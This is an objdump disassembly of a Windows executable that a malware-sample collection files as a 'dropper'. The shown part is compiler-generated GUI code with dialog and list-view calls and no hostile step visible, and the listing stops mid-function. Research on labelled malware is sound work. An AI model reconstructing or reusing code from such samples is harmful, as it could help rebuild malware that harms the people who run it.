
malware_samples/dropper/582aba94de792b8dd4dc63c428c5995be8d461b048deec9500e77ebebfd156dd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	6a ff                	push   $0xffffffff
  401002:	68 43 4c 40 00       	push   $0x404c43
  401007:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40100d:	50                   	push   %eax
  40100e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401015:	51                   	push   %ecx
  401016:	8b 44 24 14          	mov    0x14(%esp),%eax
  40101a:	56                   	push   %esi
  40101b:	57                   	push   %edi
  40101c:	8b f1                	mov    %ecx,%esi
  40101e:	50                   	push   %eax
  40101f:	68 88 00 00 00       	push   $0x88
  401024:	89 74 24 10          	mov    %esi,0x10(%esp)
  401028:	e8 ef 35 00 00       	call   0x40461c
  40102d:	8d 7e 60             	lea    0x60(%esi),%edi
  401030:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401037:	00 
  401038:	8b cf                	mov    %edi,%ecx
  40103a:	e8 d7 35 00 00       	call   0x404616
  40103f:	68 b0 43 45 00       	push   $0x4543b0
  401044:	8b cf                	mov    %edi,%ecx
  401046:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  40104b:	c7 06 70 63 40 00    	movl   $0x406370,(%esi)
  401051:	e8 ba 35 00 00       	call   0x404610
  401056:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40105a:	c7 46 64 00 00 80 3f 	movl   $0x3f800000,0x64(%esi)
  401061:	8b c6                	mov    %esi,%eax
  401063:	5f                   	pop    %edi
  401064:	5e                   	pop    %esi
  401065:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40106c:	83 c4 10             	add    $0x10,%esp
  40106f:	c2 04 00             	ret    $0x4
  401072:	90                   	nop
  401073:	90                   	nop
  401074:	90                   	nop
  401075:	90                   	nop
  401076:	90                   	nop
  401077:	90                   	nop
  401078:	90                   	nop
  401079:	90                   	nop
  40107a:	90                   	nop
  40107b:	90                   	nop
  40107c:	90                   	nop
  40107d:	90                   	nop
  40107e:	90                   	nop
  40107f:	90                   	nop
  401080:	56                   	push   %esi
  401081:	8b f1                	mov    %ecx,%esi
  401083:	e8 18 00 00 00       	call   0x4010a0
  401088:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40108d:	74 09                	je     0x401098
  40108f:	56                   	push   %esi
  401090:	e8 8d 35 00 00       	call   0x404622
  401095:	83 c4 04             	add    $0x4,%esp
  401098:	8b c6                	mov    %esi,%eax
  40109a:	5e                   	pop    %esi
  40109b:	c2 04 00             	ret    $0x4
  40109e:	90                   	nop
  40109f:	90                   	nop
  4010a0:	6a ff                	push   $0xffffffff
  4010a2:	68 58 4c 40 00       	push   $0x404c58
  4010a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4010ad:	50                   	push   %eax
  4010ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4010b5:	51                   	push   %ecx
  4010b6:	56                   	push   %esi
  4010b7:	8b f1                	mov    %ecx,%esi
  4010b9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4010bd:	8d 4e 60             	lea    0x60(%esi),%ecx
  4010c0:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4010c7:	00 
  4010c8:	e8 37 35 00 00       	call   0x404604
  4010cd:	8b ce                	mov    %esi,%ecx
  4010cf:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4010d6:	ff 
  4010d7:	e8 2e 35 00 00       	call   0x40460a
  4010dc:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4010e0:	5e                   	pop    %esi
  4010e1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4010e8:	83 c4 10             	add    $0x10,%esp
  4010eb:	c3                   	ret
  4010ec:	90                   	nop
  4010ed:	90                   	nop
  4010ee:	90                   	nop
  4010ef:	90                   	nop
  4010f0:	56                   	push   %esi
  4010f1:	8b f1                	mov    %ecx,%esi
  4010f3:	57                   	push   %edi
  4010f4:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4010f8:	8d 46 60             	lea    0x60(%esi),%eax
  4010fb:	50                   	push   %eax
  4010fc:	68 14 04 00 00       	push   $0x414
  401101:	57                   	push   %edi
  401102:	e8 2d 35 00 00       	call   0x404634
  401107:	83 c6 64             	add    $0x64,%esi
  40110a:	56                   	push   %esi
  40110b:	68 15 04 00 00       	push   $0x415
  401110:	57                   	push   %edi
  401111:	e8 18 35 00 00       	call   0x40462e
  401116:	68 00 00 80 3f       	push   $0x3f800000
  40111b:	68 cd cc cc 3d       	push   $0x3dcccccd
  401120:	56                   	push   %esi
  401121:	57                   	push   %edi
  401122:	e8 01 35 00 00       	call   0x404628
  401127:	5f                   	pop    %edi
  401128:	5e                   	pop    %esi
  401129:	c2 04 00             	ret    $0x4
  40112c:	90                   	nop
  40112d:	90                   	nop
  40112e:	90                   	nop
  40112f:	90                   	nop
  401130:	b8 50 63 40 00       	mov    $0x406350,%eax
  401135:	c3                   	ret
  401136:	90                   	nop
  401137:	90                   	nop
  401138:	90                   	nop
  401139:	90                   	nop
  40113a:	90                   	nop
  40113b:	90                   	nop
  40113c:	90                   	nop
  40113d:	90                   	nop
  40113e:	90                   	nop
  40113f:	90                   	nop
  401140:	c2 04 00             	ret    $0x4
  401143:	90                   	nop
  401144:	90                   	nop
  401145:	90                   	nop
  401146:	90                   	nop
  401147:	90                   	nop
  401148:	90                   	nop
  401149:	90                   	nop
  40114a:	90                   	nop
  40114b:	90                   	nop
  40114c:	90                   	nop
  40114d:	90                   	nop
  40114e:	90                   	nop
  40114f:	90                   	nop
  401150:	c3                   	ret
  401151:	90                   	nop
  401152:	90                   	nop
  401153:	90                   	nop
  401154:	90                   	nop
  401155:	90                   	nop
  401156:	90                   	nop
  401157:	90                   	nop
  401158:	90                   	nop
  401159:	90                   	nop
  40115a:	90                   	nop
  40115b:	90                   	nop
  40115c:	90                   	nop
  40115d:	90                   	nop
  40115e:	90                   	nop
  40115f:	90                   	nop
  401160:	8b 41 20             	mov    0x20(%ecx),%eax
  401163:	6a 00                	push   $0x0
  401165:	50                   	push   %eax
  401166:	ff 15 38 63 40 00    	call   *0x406338
  40116c:	c3                   	ret
  40116d:	90                   	nop
  40116e:	90                   	nop
  40116f:	90                   	nop
  401170:	8b 41 20             	mov    0x20(%ecx),%eax
  401173:	6a 01                	push   $0x1
  401175:	50                   	push   %eax
  401176:	ff 15 38 63 40 00    	call   *0x406338
  40117c:	c3                   	ret
  40117d:	90                   	nop
  40117e:	90                   	nop
  40117f:	90                   	nop
  401180:	e8 0b 00 00 00       	call   0x401190
  401185:	e9 26 00 00 00       	jmp    0x4011b0
  40118a:	90                   	nop
  40118b:	90                   	nop
  40118c:	90                   	nop
  40118d:	90                   	nop
  40118e:	90                   	nop
  40118f:	90                   	nop
  401190:	51                   	push   %ecx
  401191:	8d 44 24 02          	lea    0x2(%esp),%eax
  401195:	8d 4c 24 03          	lea    0x3(%esp),%ecx
  401199:	50                   	push   %eax
  40119a:	51                   	push   %ecx
  40119b:	b9 b8 43 45 00       	mov    $0x4543b8,%ecx
  4011a0:	e8 ab 06 00 00       	call   0x401850
  4011a5:	59                   	pop    %ecx
  4011a6:	c3                   	ret
  4011a7:	90                   	nop
  4011a8:	90                   	nop
  4011a9:	90                   	nop
  4011aa:	90                   	nop
  4011ab:	90                   	nop
  4011ac:	90                   	nop
  4011ad:	90                   	nop
  4011ae:	90                   	nop
  4011af:	90                   	nop
  4011b0:	68 c0 11 40 00       	push   $0x4011c0
  4011b5:	e8 a2 36 00 00       	call   0x40485c
  4011ba:	59                   	pop    %ecx
  4011bb:	c3                   	ret
  4011bc:	90                   	nop
  4011bd:	90                   	nop
  4011be:	90                   	nop
  4011bf:	90                   	nop
  4011c0:	b9 b8 43 45 00       	mov    $0x4543b8,%ecx
  4011c5:	e9 06 00 00 00       	jmp    0x4011d0
  4011ca:	90                   	nop
  4011cb:	90                   	nop
  4011cc:	90                   	nop
  4011cd:	90                   	nop
  4011ce:	90                   	nop
  4011cf:	90                   	nop
  4011d0:	83 ec 08             	sub    $0x8,%esp
  4011d3:	53                   	push   %ebx
  4011d4:	55                   	push   %ebp
  4011d5:	56                   	push   %esi
  4011d6:	8b f1                	mov    %ecx,%esi
  4011d8:	57                   	push   %edi
  4011d9:	33 ed                	xor    %ebp,%ebp
  4011db:	8b 7e 04             	mov    0x4(%esi),%edi
  4011de:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4011e1:	3b cd                	cmp    %ebp,%ecx
  4011e3:	8b 07                	mov    (%edi),%eax
  4011e5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4011e9:	74 64                	je     0x40124f
  4011eb:	8b c8                	mov    %eax,%ecx
  4011ed:	3b c1                	cmp    %ecx,%eax
  4011ef:	75 5e                	jne    0x40124f
  4011f1:	3b ff                	cmp    %edi,%edi
  4011f3:	75 5a                	jne    0x40124f
  4011f5:	8b 5f 04             	mov    0x4(%edi),%ebx
  4011f8:	a1 cc 43 45 00       	mov    0x4543cc,%eax
  4011fd:	3b d8                	cmp    %eax,%ebx
  4011ff:	8b fb                	mov    %ebx,%edi
  401201:	74 2a                	je     0x40122d
  401203:	8b 47 08             	mov    0x8(%edi),%eax
  401206:	8b ce                	mov    %esi,%ecx
  401208:	50                   	push   %eax
  401209:	e8 f2 0b 00 00       	call   0x401e00
  40120e:	8b 3f                	mov    (%edi),%edi
  401210:	55                   	push   %ebp
  401211:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  401214:	e8 a7 0c 00 00       	call   0x401ec0
  401219:	53                   	push   %ebx
  40121a:	e8 03 34 00 00       	call   0x404622
  40121f:	a1 cc 43 45 00       	mov    0x4543cc,%eax
  401224:	83 c4 04             	add    $0x4,%esp
  401227:	3b f8                	cmp    %eax,%edi
  401229:	8b df                	mov    %edi,%ebx
  40122b:	75 d6                	jne    0x401203
  40122d:	8b 4e 04             	mov    0x4(%esi),%ecx
  401230:	8d 54 24 14          	lea    0x14(%esp),%edx
  401234:	52                   	push   %edx
  401235:	89 41 04             	mov    %eax,0x4(%ecx)
  401238:	8b 46 04             	mov    0x4(%esi),%eax
  40123b:	89 6e 0c             	mov    %ebp,0xc(%esi)
  40123e:	8b ce                	mov    %esi,%ecx
  401240:	89 00                	mov    %eax,(%eax)
  401242:	8b 46 04             	mov    0x4(%esi),%eax
  401245:	89 40 08             	mov    %eax,0x8(%eax)
  401248:	e8 b3 06 00 00       	call   0x401900
  40124d:	eb 24                	jmp    0x401273
  40124f:	3b c7                	cmp    %edi,%eax
  401251:	74 20                	je     0x401273
  401253:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401257:	8b d8                	mov    %eax,%ebx
  401259:	e8 12 0c 00 00       	call   0x401e70
  40125e:	8d 44 24 14          	lea    0x14(%esp),%eax
  401262:	53                   	push   %ebx
  401263:	50                   	push   %eax
  401264:	8b ce                	mov    %esi,%ecx
  401266:	e8 35 07 00 00       	call   0x4019a0
  40126b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40126f:	3b c7                	cmp    %edi,%eax
  401271:	75 e0                	jne    0x401253
  401273:	8b 4e 04             	mov    0x4(%esi),%ecx
  401276:	51                   	push   %ecx
  401277:	e8 a6 33 00 00       	call   0x404622
  40127c:	83 c4 04             	add    $0x4,%esp
  40127f:	89 6e 04             	mov    %ebp,0x4(%esi)
  401282:	89 6e 0c             	mov    %ebp,0xc(%esi)
  401285:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401289:	33 f6                	xor    %esi,%esi
  40128b:	ff 15 7c 62 40 00    	call   *0x40627c
  401291:	a1 c8 43 45 00       	mov    0x4543c8,%eax
  401296:	48                   	dec    %eax
  401297:	a3 c8 43 45 00       	mov    %eax,0x4543c8
  40129c:	75 0c                	jne    0x4012aa
  40129e:	8b 35 cc 43 45 00    	mov    0x4543cc,%esi
  4012a4:	89 2d cc 43 45 00    	mov    %ebp,0x4543cc
  4012aa:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4012ae:	ff 15 a0 62 40 00    	call   *0x4062a0
  4012b4:	3b f5                	cmp    %ebp,%esi
  4012b6:	74 09                	je     0x4012c1
  4012b8:	56                   	push   %esi
  4012b9:	e8 64 33 00 00       	call   0x404622
  4012be:	83 c4 04             	add    $0x4,%esp
  4012c1:	5f                   	pop    %edi
  4012c2:	5e                   	pop    %esi
  4012c3:	5d                   	pop    %ebp
  4012c4:	5b                   	pop    %ebx
  4012c5:	83 c4 08             	add    $0x8,%esp
  4012c8:	c3                   	ret
  4012c9:	90                   	nop
  4012ca:	90                   	nop
  4012cb:	90                   	nop
  4012cc:	90                   	nop
  4012cd:	90                   	nop
  4012ce:	90                   	nop
  4012cf:	90                   	nop
  4012d0:	6a ff                	push   $0xffffffff
  4012d2:	68 bb 4c 40 00       	push   $0x404cbb
  4012d7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4012dd:	50                   	push   %eax
  4012de:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4012e5:	51                   	push   %ecx
  4012e6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4012ea:	53                   	push   %ebx
  4012eb:	55                   	push   %ebp
  4012ec:	56                   	push   %esi
  4012ed:	57                   	push   %edi
  4012ee:	8b f1                	mov    %ecx,%esi
  4012f0:	50                   	push   %eax
  4012f1:	68 85 00 00 00       	push   $0x85
  4012f6:	89 74 24 18          	mov    %esi,0x18(%esp)
  4012fa:	e8 1d 33 00 00       	call   0x40461c
  4012ff:	8d 7e 60             	lea    0x60(%esi),%edi
  401302:	33 ed                	xor    %ebp,%ebp
  401304:	8b cf                	mov    %edi,%ecx
  401306:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  40130a:	e8 91 33 00 00       	call   0x4046a0
  40130f:	c7 07 94 66 40 00    	movl   $0x406694,(%edi)
  401315:	8d be a0 00 00 00    	lea    0xa0(%esi),%edi
  40131b:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  401320:	8b cf                	mov    %edi,%ecx
  401322:	e8 79 33 00 00       	call   0x4046a0
  401327:	c7 07 d0 65 40 00    	movl   $0x4065d0,(%edi)
  40132d:	8d be e4 00 00 00    	lea    0xe4(%esi),%edi
  401333:	c6 44 24 1c 02       	movb   $0x2,0x1c(%esp)
  401338:	8b cf                	mov    %edi,%ecx
  40133a:	e8 d7 32 00 00       	call   0x404616
  40133f:	8d 9e ec 00 00 00    	lea    0xec(%esi),%ebx
  401345:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  40134a:	8b cb                	mov    %ebx,%ecx
  40134c:	e8 c5 32 00 00       	call   0x404616
  401351:	89 ae f0 00 00 00    	mov    %ebp,0xf0(%esi)
  401357:	68 b0 43 45 00       	push   $0x4543b0
  40135c:	8b cf                	mov    %edi,%ecx
  40135e:	c6 44 24 20 05       	movb   $0x5,0x20(%esp)
  401363:	c7 06 f8 64 40 00    	movl   $0x4064f8,(%esi)
  401369:	89 ae e0 00 00 00    	mov    %ebp,0xe0(%esi)
  40136f:	e8 9c 32 00 00       	call   0x404610
  401374:	68 b0 43 45 00       	push   $0x4543b0
  401379:	8b cb                	mov    %ebx,%ecx
  40137b:	89 ae e8 00 00 00    	mov    %ebp,0xe8(%esi)
  401381:	e8 8a 32 00 00       	call   0x404610
  401386:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40138a:	8b c6                	mov    %esi,%eax
  40138c:	5f                   	pop    %edi
  40138d:	5e                   	pop    %esi
  40138e:	5d                   	pop    %ebp
  40138f:	5b                   	pop    %ebx
  401390:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401397:	83 c4 10             	add    $0x10,%esp
  40139a:	c2 04 00             	ret    $0x4
  40139d:	90                   	nop
  40139e:	90                   	nop
  40139f:	90                   	nop
  4013a0:	56                   	push   %esi
  4013a1:	8b f1                	mov    %ecx,%esi
  4013a3:	e8 18 00 00 00       	call   0x4013c0
  4013a8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4013ad:	74 09                	je     0x4013b8
  4013af:	56                   	push   %esi
  4013b0:	e8 6d 32 00 00       	call   0x404622
  4013b5:	83 c4 04             	add    $0x4,%esp
  4013b8:	8b c6                	mov    %esi,%eax
  4013ba:	5e                   	pop    %esi
  4013bb:	c2 04 00             	ret    $0x4
  4013be:	90                   	nop
  4013bf:	90                   	nop
  4013c0:	6a ff                	push   $0xffffffff
  4013c2:	68 0d 4d 40 00       	push   $0x404d0d
  4013c7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4013cd:	50                   	push   %eax
  4013ce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4013d5:	51                   	push   %ecx
  4013d6:	56                   	push   %esi
  4013d7:	8b f1                	mov    %ecx,%esi
  4013d9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4013dd:	8b 86 f0 00 00 00    	mov    0xf0(%esi),%eax
  4013e3:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%esp)
  4013ea:	00 
  4013eb:	85 c0                	test   %eax,%eax
  4013ed:	74 06                	je     0x4013f5
  4013ef:	8b 08                	mov    (%eax),%ecx
  4013f1:	50                   	push   %eax
  4013f2:	ff 51 08             	call   *0x8(%ecx)
  4013f5:	8d 8e ec 00 00 00    	lea    0xec(%esi),%ecx
  4013fb:	c6 44 24 10 03       	movb   $0x3,0x10(%esp)
  401400:	e8 ff 31 00 00       	call   0x404604
  401405:	8d 8e e4 00 00 00    	lea    0xe4(%esi),%ecx
  40140b:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  401410:	e8 ef 31 00 00       	call   0x404604
  401415:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  40141b:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  401420:	e8 6f 32 00 00       	call   0x404694
  401425:	8d 4e 60             	lea    0x60(%esi),%ecx
  401428:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  40142d:	e8 68 32 00 00       	call   0x40469a
  401432:	8b ce                	mov    %esi,%ecx
  401434:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  40143b:	ff 
  40143c:	e8 c9 31 00 00       	call   0x40460a
  401441:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401445:	5e                   	pop    %esi
  401446:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40144d:	83 c4 10             	add    $0x10,%esp
  401450:	c3                   	ret
  401451:	90                   	nop
  401452:	90                   	nop
  401453:	90                   	nop
  401454:	90                   	nop
  401455:	90                   	nop
  401456:	90                   	nop
  401457:	90                   	nop
  401458:	90                   	nop
  401459:	90                   	nop
  40145a:	90                   	nop
  40145b:	90                   	nop
  40145c:	90                   	nop
  40145d:	90                   	nop
  40145e:	90                   	nop
  40145f:	90                   	nop
  401460:	53                   	push   %ebx
  401461:	56                   	push   %esi
  401462:	8b f1                	mov    %ecx,%esi
  401464:	57                   	push   %edi
  401465:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401469:	8d 46 60             	lea    0x60(%esi),%eax
  40146c:	50                   	push   %eax
  40146d:	68 05 04 00 00       	push   $0x405
  401472:	57                   	push   %edi
  401473:	e8 34 32 00 00       	call   0x4046ac
  401478:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  40147e:	51                   	push   %ecx
  40147f:	68 04 04 00 00       	push   $0x404
  401484:	57                   	push   %edi
  401485:	e8 22 32 00 00       	call   0x4046ac
  40148a:	8d 9e e0 00 00 00    	lea    0xe0(%esi),%ebx
  401490:	53                   	push   %ebx
  401491:	68 18 04 00 00       	push   $0x418
  401496:	57                   	push   %edi
  401497:	e8 92 31 00 00       	call   0x40462e
  40149c:	68 00 40 1c 46       	push   $0x461c4000
  4014a1:	68 00 00 80 3f       	push   $0x3f800000
  4014a6:	53                   	push   %ebx
  4014a7:	57                   	push   %edi
  4014a8:	e8 7b 31 00 00       	call   0x404628
  4014ad:	8d 96 e4 00 00 00    	lea    0xe4(%esi),%edx
  4014b3:	52                   	push   %edx
  4014b4:	68 16 04 00 00       	push   $0x416
  4014b9:	57                   	push   %edi
  4014ba:	e8 75 31 00 00       	call   0x404634
  4014bf:	8d 86 e8 00 00 00    	lea    0xe8(%esi),%eax
  4014c5:	50                   	push   %eax
  4014c6:	68 07 04 00 00       	push   $0x407
  4014cb:	57                   	push   %edi
  4014cc:	e8 d5 31 00 00       	call   0x4046a6
  4014d1:	81 c6 ec 00 00 00    	add    $0xec,%esi
  4014d7:	56                   	push   %esi
  4014d8:	68 17 04 00 00       	push   $0x417
  4014dd:	57                   	push   %edi
  4014de:	e8 51 31 00 00       	call   0x404634
  4014e3:	5f                   	pop    %edi
  4014e4:	5e                   	pop    %esi
  4014e5:	5b                   	pop    %ebx
  4014e6:	c2 04 00             	ret    $0x4
  4014e9:	90                   	nop
  4014ea:	90                   	nop
  4014eb:	90                   	nop
  4014ec:	90                   	nop
  4014ed:	90                   	nop
  4014ee:	90                   	nop
  4014ef:	90                   	nop
  4014f0:	b8 48 64 40 00       	mov    $0x406448,%eax
  4014f5:	c3                   	ret
  4014f6:	90                   	nop
  4014f7:	90                   	nop
  4014f8:	90                   	nop
  4014f9:	90                   	nop
  4014fa:	90                   	nop
  4014fb:	90                   	nop
  4014fc:	90                   	nop
  4014fd:	90                   	nop
  4014fe:	90                   	nop
  4014ff:	90                   	nop
  401500:	56                   	push   %esi
  401501:	8b f1                	mov    %ecx,%esi
  401503:	57                   	push   %edi
  401504:	8b 3d 34 63 40 00    	mov    0x406334,%edi
  40150a:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  401510:	6a 00                	push   $0x0
  401512:	6a 00                	push   $0x0
  401514:	68 42 10 00 00       	push   $0x1042
  401519:	50                   	push   %eax
  40151a:	ff d7                	call   *%edi
  40151c:	85 c0                	test   %eax,%eax
  40151e:	7c 23                	jl     0x401543
  401520:	8b 8e c0 00 00 00    	mov    0xc0(%esi),%ecx
  401526:	6a 00                	push   $0x0
  401528:	50                   	push   %eax
  401529:	68 08 10 00 00       	push   $0x1008
  40152e:	51                   	push   %ecx
  40152f:	ff d7                	call   *%edi
  401531:	8b 96 c0 00 00 00    	mov    0xc0(%esi),%edx
  401537:	6a 00                	push   $0x0
  401539:	6a 00                	push   $0x0
  40153b:	68 43 10 00 00       	push   $0x1043
  401540:	52                   	push   %edx
  401541:	ff d7                	call   *%edi
  401543:	5f                   	pop    %edi
  401544:	5e                   	pop    %esi
  401545:	c3                   	ret
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop
  401550:	56                   	push   %esi
  401551:	8b f1                	mov    %ecx,%esi
  401553:	e8 a8 ff ff ff       	call   0x401500
  401558:	8b ce                	mov    %esi,%ecx
  40155a:	e8 81 17 00 00       	call   0x402ce0
  40155f:	5e                   	pop    %esi
  401560:	c3                   	ret
  401561:	90                   	nop
  401562:	90                   	nop
  401563:	90                   	nop
  401564:	90                   	nop
  401565:	90                   	nop
  401566:	90                   	nop
  401567:	90                   	nop
  401568:	90                   	nop
  401569:	90                   	nop
  40156a:	90                   	nop
  40156b:	90                   	nop
  40156c:	90                   	nop
  40156d:	90                   	nop
  40156e:	90                   	nop
  40156f:	90                   	nop
  401570:	6a ff                	push   $0xffffffff
  401572:	68 36 4d 40 00       	push   $0x404d36
  401577:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40157d:	50                   	push   %eax
  40157e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401585:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40158b:	53                   	push   %ebx
  40158c:	55                   	push   %ebp
  40158d:	8b 2d 34 63 40 00    	mov    0x406334,%ebp
  401593:	56                   	push   %esi
  401594:	8b f1                	mov    %ecx,%esi
  401596:	57                   	push   %edi
  401597:	6a 00                	push   $0x0
  401599:	6a 00                	push   $0x0
  40159b:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  4015a1:	68 42 10 00 00       	push   $0x1042
  4015a6:	50                   	push   %eax
  4015a7:	ff d5                	call   *%ebp
  4015a9:	8b f8                	mov    %eax,%edi
  4015ab:	6a 00                	push   $0x0
  4015ad:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4015b1:	8d 9e a0 00 00 00    	lea    0xa0(%esi),%ebx
  4015b7:	57                   	push   %edi
  4015b8:	51                   	push   %ecx
  4015b9:	8b cb                	mov    %ebx,%ecx
  4015bb:	e8 04 31 00 00       	call   0x4046c4
  4015c0:	50                   	push   %eax
  4015c1:	8d 8e e4 00 00 00    	lea    0xe4(%esi),%ecx
  4015c7:	c7 84 24 a4 00 00 00 	movl   $0x0,0xa4(%esp)
  4015ce:	00 00 00 00 
  4015d2:	e8 e7 30 00 00       	call   0x4046be
  4015d7:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4015db:	c7 84 24 a0 00 00 00 	movl   $0xffffffff,0xa0(%esp)
  4015e2:	ff ff ff ff 
  4015e6:	e8 19 30 00 00       	call   0x404604
  4015eb:	8d 54 24 18          	lea    0x18(%esp),%edx
  4015ef:	68 80 00 00 00       	push   $0x80
  4015f4:	52                   	push   %edx
  4015f5:	6a 01                	push   $0x1
  4015f7:	57                   	push   %edi
  4015f8:	8b cb                	mov    %ebx,%ecx
  4015fa:	e8 b9 30 00 00       	call   0x4046b8
  4015ff:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  401605:	8d 44 24 18          	lea    0x18(%esp),%eax
  401609:	50                   	push   %eax
  40160a:	6a 00                	push   $0x0
  40160c:	68 4d 01 00 00       	push   $0x14d
  401611:	51                   	push   %ecx
  401612:	ff d5                	call   *%ebp
  401614:	6a 02                	push   $0x2
  401616:	8d 54 24 14          	lea    0x14(%esp),%edx
  40161a:	57                   	push   %edi
  40161b:	52                   	push   %edx
  40161c:	8b cb                	mov    %ebx,%ecx
  40161e:	e8 a1 30 00 00       	call   0x4046c4
  401623:	50                   	push   %eax
  401624:	8d 8e ec 00 00 00    	lea    0xec(%esi),%ecx
  40162a:	c7 84 24 a4 00 00 00 	movl   $0x1,0xa4(%esp)
  401631:	01 00 00 00 
  401635:	e8 84 30 00 00       	call   0x4046be
  40163a:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40163e:	c7 84 24 a0 00 00 00 	movl   $0xffffffff,0xa0(%esp)
  401645:	ff ff ff ff 
  401649:	e8 b6 2f 00 00       	call   0x404604
  40164e:	6a 03                	push   $0x3
  401650:	8d 44 24 14          	lea    0x14(%esp),%eax
  401654:	57                   	push   %edi
  401655:	50                   	push   %eax
  401656:	8b cb                	mov    %ebx,%ecx
  401658:	e8 67 30 00 00       	call   0x4046c4
  40165d:	8b 00                	mov    (%eax),%eax
  40165f:	50                   	push   %eax
  401660:	ff 15 d0 62 40 00    	call   *0x4062d0
  401666:	d9 9e e0 00 00 00    	fstps  0xe0(%esi)
  40166c:	83 c4 04             	add    $0x4,%esp
  40166f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401673:	e8 8c 2f 00 00       	call   0x404604
  401678:	6a 04                	push   $0x4
  40167a:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40167e:	57                   	push   %edi
  40167f:	51                   	push   %ecx
  401680:	8b cb                	mov    %ebx,%ecx
  401682:	e8 3d 30 00 00       	call   0x4046c4
  401687:	8b 00                	mov    (%eax),%eax
  401689:	8d 96 e8 00 00 00    	lea    0xe8(%esi),%edx
  40168f:	52                   	push   %edx
  401690:	50                   	push   %eax
  401691:	e8 4a 16 00 00       	call   0x402ce0
  401696:	83 c4 08             	add    $0x8,%esp
  401699:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40169d:	e8 62 2f 00 00       	call   0x404604
  4016a2:	6a 00                	push   $0x0
  4016a4:	8b ce                	mov    %esi,%ecx
  4016a6:	e8 07 30 00 00       	call   0x4046b2
  4016ab:	8b 8c 24 ac 00 00 00 	mov    0xac(%esp),%ecx
  4016b2:	5f                   	pop    %edi
  4016b3:	5e                   	pop    %esi
  4016b4:	5d                   	pop    %ebp
  4016b5:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4016bb:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  4016c2:	5b                   	pop    %ebx
  4016c3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4016ca:	81 c4 94 00 00 00    	add    $0x94,%esp
  4016d0:	c2 08 00             	ret    $0x8
  4016d3:	90                   	nop
  4016d4:	90                   	nop
  4016d5:	90                   	nop
  4016d6:	90                   	nop
  4016d7:	90                   	nop
  4016d8:	90                   	nop
  4016d9:	90                   	nop
  4016da:	90                   	nop
  4016db:	90                   	nop
  4016dc:	90                   	nop
  4016dd:	90                   	nop
  4016de:	90                   	nop
  4016df:	90                   	nop
  4016e0:	6a ff                	push   $0xffffffff
  4016e2:	68 58 4d 40 00       	push   $0x404d58
  4016e7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016ed:	50                   	push   %eax
  4016ee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4016f5:	81 ec ac 00 00 00    	sub    $0xac,%esp
  4016fb:	53                   	push   %ebx
  4016fc:	55                   	push   %ebp
  4016fd:	56                   	push   %esi
  4016fe:	57                   	push   %edi
  4016ff:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  401703:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401707:	68 80 00 00 00       	push   $0x80
  40170c:	50                   	push   %eax
